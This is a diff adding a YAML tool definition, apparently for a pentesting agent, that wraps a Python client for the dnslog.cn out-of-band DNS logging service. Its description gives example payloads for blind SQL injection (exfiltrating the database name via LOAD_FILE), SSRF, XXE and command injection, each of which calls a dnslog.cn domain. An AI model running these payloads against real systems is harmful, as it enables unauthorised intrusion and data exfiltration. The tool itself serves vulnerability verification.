@@ -1,0 +1,67 @@
+name: "dnslog"
+command: "python3"
+args:
+  - "-c"
+  - "import sys\nimport requests\nimport json\nimport time\nimport os\nimport tempfile\n\nif len(sys.argv) < 2:\n    sys.stderr.write(\"Error: missing operation type argument (get_domain or get_records)\\n\")\n    sys.exit(1)\n\noperation = sys.argv[1]\nbase_url = \"http://dnslog.cn\"\n\n# Store the cookie in a temporary file\ncookie_file = os.path.join(tempfile.gettempdir(), \"dnslog_cookie.txt\")\n\n# Create a session to keep the cookie\nsession = requests.Session()\n\n# If the cookie file exists, load the cookie\ntry:\n    if os.path.exists(cookie_file):\n        with open(cookie_file, 'r') as f:\n            for line in f:\n                if 'PHPSESSID' in line:\n                    session.cookies.set('PHPSESSID', line.strip().split('=')[1])\nexcept:\n    pass\n\ntry:\n    if operation == \"get_domain\":\n        # Get a temporary domain (this sets the cookie)\n        response = session.get(f\"{base_url}/getdomain.php\", timeout=10)\n        response.raise_for_status()\n        domain = response.text.strip().rstrip('%')\n        \n        # Save the cookie to file\n        try:\n            with open(cookie_file, 'w') as f:\n                for cookie in session.cookies:\n                    f.write(f\"{cookie.name}={cookie.value}\\n\")\n        except:\n            pass\n        \n        if domain:\n            result = {\n                \"status\": \"success\",\n                \"domain\": domain,\n                \"message\": f\"Successfully obtained temporary domain: {domain}\",\n                \"usage\": f\"Use this domain for DNS query testing, e.g.: nslookup {domain} or ping http://{domain}\",\n                \"note\": \"The domain is valid for 24 hours; query the records promptly\"\n            }\n            print(json.dumps(result, ensure_ascii=False, indent=2))\n        else:\n            print(json.dumps({\n                \"status\": \"error\",\n                \"message\": \"Failed to obtain a domain, please try again later\"\n            }, ensure_ascii=False, indent=2))\n            sys.exit(1)\n    \n    elif operation == \"get_records\":\n        # Get DNS query records\n        if len(sys.argv) < 3:\n            sys.stderr.write(\"Error: the get_records operation requires a domain argument\\n\")\n            sys.exit(1)\n        \n        domain = sys.argv[2]\n        wait_time = int(sys.argv[3]) if len(sys.argv) > 3 and sys.argv[3] else 0\n        \n        # If a wait time is specified, wait first\n        if wait_time > 0:\n            print(f\"Waiting {wait_time} seconds before querying records...\", file=sys.stderr)\n            time.sleep(wait_time)\n        \n        # Load the cookie (if it exists)\n        try:\n            if os.path.exists(cookie_file):\n                with open(cookie_file, 'r') as f:\n                    for line in f:\n                        if 'PHPSESSID' in line:\n                            session.cookies.set('PHPSESSID', line.strip().split('=')[1])\n        except:\n            pass\n        \n        response = session.get(f\"{base_url}/getrecords.php\", params={\"t\": domain}, timeout=10)\n        response.raise_for_status()\n        records_text = response.text.strip().rstrip('%')\n        \n        if records_text and records_text != \"[]\" and records_text.strip():\n            # Try to parse as JSON (if the response is in JSON format)\n            try:\n                records = json.loads(records_text)\n                if isinstance(records, list) and len(records) > 0:\n                    result = {\n                        \"status\": \"success\",\n                        \"domain\": domain,\n                        \"record_count\": len(records),\n                        \"records\": records,\n                        \"message\": f\"Found {len(records)} DNS query record(s)\"\n                    }\n                    print(json.dumps(result, ensure_ascii=False, indent=2))\n                else:\n                    result = {\n                        \"status\": \"no_records\",\n                        \"domain\": domain,\n                        \"records\": [],\n                        \"message\": \"No DNS query records yet; the target may not have triggered a DNS query\"\n                    }\n                    print(json.dumps(result, ensure_ascii=False, indent=2))\n            except json.JSONDecodeError:\n                # Not JSON, split by lines\n                records = [line.strip() for line in records_text.split(\"\\n\") if line.strip() and line.strip() != \"[]\"]\n                if records:\n                    result = {\n                        \"status\": \"success\",\n                        \"domain\": domain,\n                        \"record_count\": len(records),\n                        \"records\": records,\n                        \"message\": f\"Found {len(records)} DNS query record(s)\"\n                    }\n                    print(json.dumps(result, ensure_ascii=False, indent=2))\n                else:\n                    result = {\n                        \"status\": \"no_records\",\n                        \"domain\": domain,\n                        \"records\": [],\n                        \"message\": \"No DNS query records yet\"\n                    }\n                    print(json.dumps(result, ensure_ascii=False, indent=2))\n        else:\n            result = {\n                \"status\": \"no_records\",\n                \"domain\": domain,\n                \"records\": [],\n                \"message\": \"No DNS query records yet; the target may not have triggered a DNS query\"\n            }\n            print(json.dumps(result, ensure_ascii=False, indent=2))\n    \n    else:\n        sys.stderr.write(f\"Error: unknown operation type '{operation}'; supported operations: get_domain, get_records\\n\")\n        sys.exit(1)\n\nexcept requests.RequestException as e:\n    error_result = {\n        \"status\": \"error\",\n        \"message\": f\"Request failed: {str(e)}\",\n        \"suggestion\": \"Please check your network connection or try again later\"\n    }\n    print(json.dumps(error_result, ensure_ascii=False, indent=2))\n    sys.exit(1)\nexcept Exception as e:\n    error_result = {\n        \"status\": \"error\",\n        \"message\": f\"Execution error: {str(e)}\"\n    }\n    print(json.dumps(error_result, ensure_ascii=False, indent=2))\n    sys.exit(1)\n"
+enabled: true
+short_description: "DNSlog tool for verifying blind vulnerabilities such as blind injection, SSRF, and XXE"
+description: |
+  DNSlog is a DNS query record tool implemented on top of the dnslog.cn service. It is mainly used to verify blind vulnerabilities such as blind injection, SSRF, XXE, and command injection.
+
+  **Main features:**
+  - Get a temporary domain: generate a unique temporary domain for DNS query testing
+  - Query DNS records: check whether any DNS query has reached that domain
+  - Wait time support: wait for a specified time before querying, for asynchronous vulnerability verification
+
+  **Use cases:**
+  - **Blind SQL injection testing**: use a DNS query in the SQL injection payload to confirm the injection succeeded
+    - Example: `SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.xxx.dnslog.cn\\abc'))`
+  - **SSRF vulnerability verification**: confirm the SSRF vulnerability exists via a DNS query
+    - Example: `http://target.com/api?url=http://xxx.dnslog.cn`
+  - **XXE vulnerability verification**: trigger a DNS query via an external entity reference
+    - Example: `<!ENTITY xxe SYSTEM "http://xxx.dnslog.cn">`
+  - **Command injection testing**: use a DNS query in the command injection payload
+    - Example: `nslookup xxx.dnslog.cn` or `ping xxx.dnslog.cn`
+  - **Blind vulnerability verification**: any case where you need to confirm whether the target performed a specific action
+
+  **Workflow:**
+  1. Use `operation=get_domain` to get a temporary domain (e.g. `abc123.dnslog.cn`)
+  2. Use that domain in the vulnerability test payload
+  3. Use `operation=get_records` to check whether any DNS query records have arrived
+  4. If records appear, the vulnerability exists and the payload was executed
+
+  **Notes:**
+  - The temporary domain is valid for 24 hours
+  - DNS queries may be delayed; it is recommended to wait a few seconds before querying records
+  - This tool depends on the dnslog.cn service and requires a network connection
+  - The tool manages the cookie session automatically, ensuring that obtaining the domain and querying records use the same session
+parameters:
+  - name: "operation"
+    type: "string"
+    description: |
+      Operation type. Two operations are supported:
+      - `get_domain`: get a temporary domain
+      - `get_records`: query DNS records
+    required: true
+    position: 0
+    format: "positional"
+  - name: "domain"
+    type: "string"
+    description: |
+      Domain parameter (only used for the get_records operation)
+
+      When operation is get_records, this parameter is required and must be the temporary domain obtained earlier.
+    required: false
+    position: 1
+    format: "positional"
+  - name: "wait_time"
+    type: "int"
+    description: |
+      Wait time (seconds, only used for the get_records operation)
+
+      Number of seconds to wait before querying DNS records. Gives the target system enough time to perform the DNS query.
+      Recommended value: 3-10 seconds, adjusted according to network latency and vulnerability type.
+    required: false
+    position: 2
+    format: "positional"
+    default: 0
